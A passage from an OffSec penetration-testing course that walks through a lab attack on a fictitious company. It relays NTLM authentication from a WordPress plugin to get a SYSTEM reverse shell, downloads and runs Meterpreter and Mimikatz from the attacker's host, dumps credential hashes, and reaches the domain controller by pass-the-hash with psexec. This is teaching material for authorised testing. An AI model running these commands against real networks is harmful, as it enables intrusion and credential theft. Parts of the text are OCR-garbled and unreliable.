
# OffSec

Penetration Testing with Kali Linux

Let's set the path to the URI reference¹²¹⁰ //92.168.119.5/test in which the IP is the address of our Kali machine and test is a nonexistent path.

![](img/336d6ea891e7464f18ad64426619ced4_856_0.png)

Once entered, we can scroll down and click on Save. This should cause the WordPress plugin to authenticate with impacket-ntlmrelay in the context of the user running WordPress.

- [+] Authenticating against against-smb://192.168.50.242 as INTERNALSRV1/ADMINISTRATOR SUCCEED
- * Service RemoteRegistry is in stopped state
- * Starting service RemoteRegistry
- [+] Executed command on host: 192.168.50.242
- [+] Stopping RemoteRegistry

> Listing 938 - Executing reverse shell on MAILSRV1 via impacket-ntlmrelay

Listing 938 confirms the assumptions we made earlier. First, INTERNALSRV1/ADMINISTR was used to perform the authentication. Second, by successfully authenticating to MAILSRV1, we confirmed that both machines use the same password for the local Administrator account.

The output shows that the relayed command on MAILSRV1 got executed. Let's check our Netcat listener for an incoming reverse shell.

```
connect to [192.168.119.5] from (UNKNOWN) [192.168.50.242] 50063
whoami
nt authority\system
```

```
PS C:\Windows\system32> hostname
MAILSRV1
```

```
PS C:\Windows\system32>
```

> Listing 939 - Incoming reverse shell

¹²¹⁰ (Wikipedia, 2022). https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#URI_references

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

# OffSec

Penetration Testing with Kali Linux

Great! We successfully obtained code execution as NT AUTHORITY\SYSTEM by authenticating as a local Administrator on MAILSRV1 by relaying an authentication attempt from the WordPress plugin on INTERNALSRV1.

In the next Learning Unit, we will leverage the interactive shell on MAILSRV1 to obtain privileged access to the domain and its domain controller.

# 24.6 Gaining Access to the Domain Controller

This Learning Unit covers the following client-side attacks

- * Gather information to prepare client-side attacks
- Leverage fingerprinting to obtain information

In the next Learning Unit, we gained access to MAILSRV1 as NT AUTHORITY\SYSTEM. Based on the information from enumerating the network, we will attempt to obtain Administrator privileges in the Learning Unit and use them to extract the domain controller.

# 24.6.1 Cached Credentials

As planned, we obtained privileged code execution on MAILSRV1. Our next step is to extract the password hash for the user daniela, which has an active session on the system.

> Depending on the objective of the penetration test, we should not skip the local enumeration of the MAILSRV1 system. This could reveal additional vulnerabilities and sensitive information, which we may miss if we directly attempt to extract the NTLM hash for daniela.

If we discover that no AV is running, we should upgrade our shell to Meterpreter. This will not provide us with a more robust shell environment, but aiding in post-exploitation.

Let's download the preferable Meterpreter reverse shell payload **met.exe** to perform post-exploitation.

```
PS C:\system32> cd C:\Users\Administrator
PS C:\Users\Administrator> iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe
PS C:\Users\Administrator> .\.met.exe
```

In Metasploit, we should receive a new incoming session.

- Sending stage (208774 bytes) to 192.168.50.242
- Meterpreter session 2 opened (192.168.119.5:443 -> 192.168.50.242:50814)

Let's interact with the session and spawn a new PowerShell command line.

PWK - Copyright 2023 OffSec Services Limited. All rights reserved.

```
msf6 post(multi/manage/autoroute) > sessions -i 2
[*] interaction with 2...
```

```
meterpreter > shell
Process 416 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.
```

```
C:\Users\administrator> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```

Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows

```
PS C:\Users\Administrator>
```
Listing 942 - Interaction with Session 2 and spawning a PowerShell command shell

```

Next, we will download the current Mimikatz¹12¹ version on Kali and serve it via our Python3 server on port 8000. On MAILSRV1, we will download Mimikatz with iwr and launch it.

```
PS C:\Users\Administrator> iwr -uri http://192.168.119.5:8000/mimikatz.exe -outfile mimikatz.exe
```

```
PS C:\Users\Administrator> .mimikatz.exe
.mimi
```

```
#####
## # ^. mimikatz 2.2.0 (#x694) Sep 19 2022 17:44:08
## # / > A Vie La L'Amour" (oeoo)
## # / // ### Mimikatz DELP > gentilikwi¹ (benjamin@gentilikwi.com)
## # / // > https://log.gentilikwi.com/mimikatz (vincent.letoux@gmail.com)
## # ##
VINCENT LETUX
> https://pingcastle.com / https://mysmartygon.com ***
#####
```
Listing 943 - Downloading and launching the latest version of Mimikatz

Once Mimikatz is launched, we can use privilege::debug to obtain Privilege¹². Then, we can use sekurlsa::logon to list all credentials.

```
mimikatz > privilege::debug
Privilege 'OK'
mimikatz > sekurlsa::logon
...
```

```
Authentication Id : 0
Session : 1
User Name : becky
Domain : BEYOND
Logon Server : DCSRV
Logon Time : 3/8/2023 4:50:32 AM
```

```
Username: becky
Domain: BEYOND
NTLM: f39eca5af4997f6db0787704b3
SHA1: d28b761fbd215174fd993e2c52de443cc
Github, (2022). https://github.com/gentilikwi/mimikatz/releases
Microsoft Learn, (2022). https://learn.microsoft.com/en-us/windows/security/threat-protection/policy-settings
```

PWK - © 2023 OffSec Services Limited. All rights reserved.

# OffSec

Penetration Testing with Kali Linux

```
SID : S-5-21-1104083-291554705-2081307249-1108
```

Great! We successfully extracted the cleartext and NTLM hash of administrator. Let's store both of them with the username in creds.txt on our Kali system.

Armed with these credentials, we can now take the last step of penetration: accessing the domain controller. We'll do this in the next section.

# 24.6.2 Lateral Movement

In this section we'll leverage the domain admin privileges to get access to the domain controller and achieve the second goal of the penetration test.

Because we've obtained the cleartext and NTLM hash for administrator, we can use impacket-psexec to get an interactive on DCSRV. While we could use either of them, let's use the NTLM hash. Once we have a command line, then we have privileged access on DCSRV.

```
kali@kali: ~ proxychains -q impacket-psexec -hashes
```

- [+] Request shares on...
- [+] Found writable share ADMIN$
- [+] Uploading file psexec.exe
- [+] Opening SCM on...
- [+] Creating service on...
- [+] Starting service...
- [+] Press help for extra commands
Microsoft Windows [Version 10.0.20348.1006]
(C) Microsoft Corporation. All rights reserved.

```
C:\Windows\system32> whoami
nt authority\system
```

# OffSec

Penetration Testing with Kali Linux

```
C:\Windows\system32> hostname
DCSRV
```

```
C:\Windows\system32> ipconfig
```

Windows IP Configuration

Ethernet adapter Ethernet0:

| Connection-specific Suffix | | |
| :--- | :--- | :--- |
| IPv4 Address | | 172.16.6.24 |
| Subnet Mask | | 255.255.255.0 |
| Default Gateway | | 172.16.6.254 |

Using psexec to get an interactive shell

Listing 945 shows that we achieved all goals of the penetration test by obtaining domain administrator privileges and accessing the domain controller.

# 24.7 Wrapping Up

In this Module, we performed a penetration test for the fictitious client BEYOND Finances. The goals set by the client to gain access to the internal network, obtain domain Administrator privileges, and access the domain controller.

Once we managed to get an initial foothold in the internal network, we performed Kerberoasting to obtain the credentials of a domain user. With this account, we could log in to a WordPress instance and use a plugin to authenticate to our Kali Machine. We then relayed the authentication request to another machine and obtained code execution as NT AUTHORITY\SYSTEM. With administrative privileges, we extracted the credentials of a domain Admin account. Then, we successfully accessed the domain controller.

We cannot emphasize enough to take detailed notes throughout a real penetration test and keep a good log of when certain actions were performed. After a penetration test, we must ensure that we leave everything way it was. Any exploits or artifacts must be removed, or at the very least, the client should be notified of their location.

At the end of this Module, let's talk about some of the key takeaways of this penetration test. One of the most important lessons of this Module (and the whole course) is to always conduct thorough enumeration. We cannot attack what we missed and therefore make sure to always map out the entire attack surface of all accessible machines and services within the scope of an assessment.

Another important takeaway is that we should never skip or cut the enumeration process to chase a quick win. We may miss crucial information, potentially leading to a much more promising attacker.

Next, once we have obtained administrative privileges on a target system, we should not jump straight to the next machine. Armed with these privileges, we can examine areas of the system that may have been previously inaccessible.

Finally, let's discuss how we worked with gathered information such as enumeration results. It is crucial that we learn to combine information found on different systems and stages of a.
